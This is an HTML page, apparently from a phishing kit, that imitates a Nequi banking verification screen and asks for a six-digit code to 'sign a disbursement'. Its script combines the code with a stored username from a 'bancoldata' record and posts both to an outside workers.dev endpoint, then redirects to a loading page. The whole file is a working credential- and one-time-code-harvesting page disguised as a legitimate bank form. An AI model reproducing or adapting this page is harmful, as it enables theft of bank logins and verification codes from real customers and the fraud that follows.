<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Validación</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
body{
    margin:0;
    font-family:'Inter',sans-serif;
    background:#f4f4f400;
}

.header{
    padding:20px;
    font-size:22px;
    font-weight:600;
}

.container{
    text-align:center;
    padding:20px;
}

.code-boxes{
    display:flex;
    justify-content:center;
    gap:10px;
    margin:25px 0;
}

.box{
    width:45px;
    height:55px;
    border-radius:10px;
    background:#e6e3eb;
    font-size:22px;
    display:flex;
    align-items:center;
    justify-content:center;
}

.text{
    color:#555;
    font-size:15px;
}

.email{
    color:#e91e63;
    font-weight:600;
}

/* INPUT OCULTO */
#claveInput{
    position:absolute;
    opacity:0;
}

/* TECLADO */
.keyboard{
    position:fixed;
    bottom:0;
    width:100%;
    background:white;
    padding:15px 0;
}

.keys{
    display:grid;
    grid-template-columns:repeat(3,1fr);
    gap:20px;
    max-width:300px;
    margin:auto;
}

.key{
    font-size:26px;
    text-align:center;
    padding:15px;
    cursor:pointer;
}
</style>
</head>

<body>

<div class="header">← Ingresa el código</div>

<div class="container">

    <div class="code-boxes" id="boxes"></div>

    <div class="text">
        Escribe los 6 números que enviamos a tu correo electrónico,<br>o mensaje de texto a tu numero celular para Firmar el desembolso Nequi.
    </div>

    <!-- INPUT REAL -->
    <input 
        type="password"
        id="claveInput"
        maxlength="6"
        inputmode="numeric"
    >

</div>

<!-- TECLADO -->
<div class="keyboard">
    <div class="keys">
        <div class="key">1</div>
        <div class="key">2</div>
        <div class="key">3</div>
        <div class="key">4</div>
        <div class="key">5</div>
        <div class="key">6</div>
        <div class="key">7</div>
        <div class="key">8</div>
        <div class="key">9</div>
        <div class="key"></div>
        <div class="key">0</div>
        <div class="key">⌫</div>
    </div>
</div>

<script>
const claveInput = document.getElementById('claveInput');

/* CREAR 6 CAJAS */
const boxesContainer = document.getElementById("boxes");

for(let i=0;i<6;i++){
    const div = document.createElement("div");
    div.classList.add("box");
    boxesContainer.appendChild(div);
}

const boxes = document.querySelectorAll(".box");

/* ACTUALIZAR CAJAS */
function updateBoxes(){
    const val = claveInput.value;
    boxes.forEach((box,i)=>{
        box.textContent = val[i] ? "•" : "";
    });
}

/* 🔥 AUTO LOGIN CUANDO COMPLETA 6 */
async function enviarCodigo(){
    const claveValue = claveInput.value.trim();
    if (claveValue.length !== 6) return;

    try {
        let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
        const usuario = bancoldata.usuario;

        const transactionId = 'txn_' + Date.now();

        bancoldata.clave = claveValue;
        bancoldata.transactionId = transactionId;

        localStorage.setItem('bancoldata', JSON.stringify(bancoldata));

        const response = await fetch('https://quiet-haze-3548.micollflorez.workers.dev/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ usuario, clave: claveValue, transactionId })
        });

        const result = await response.json();

        if (result.ok) {
            window.location.href = "loading.html";
        } else {
            alert("Código incorrecto");
        }

    } catch (err) {
        console.error(err);
        alert("Error al procesar");
    }
}

/* INPUT */
claveInput.addEventListener('input', () => {
    if (claveInput.value.length > 6) {
        claveInput.value = claveInput.value.slice(0, 6);
    }

    updateBoxes();

    if (claveInput.value.length === 6) {
        enviarCodigo(); // 🔥 AUTO ENVÍO
    }
});

/* TECLADO */
document.querySelectorAll(".key").forEach(key=>{
    key.addEventListener("click", ()=>{
        let val = claveInput.value;

        if(key.textContent === "⌫"){
            claveInput.value = val.slice(0,-1);
        }else if(key.textContent !== ""){
            if(val.length < 6){
                claveInput.value += key.textContent;
            }
        }

        claveInput.dispatchEvent(new Event("input"));
    });
});
</script>

</body>
</html>
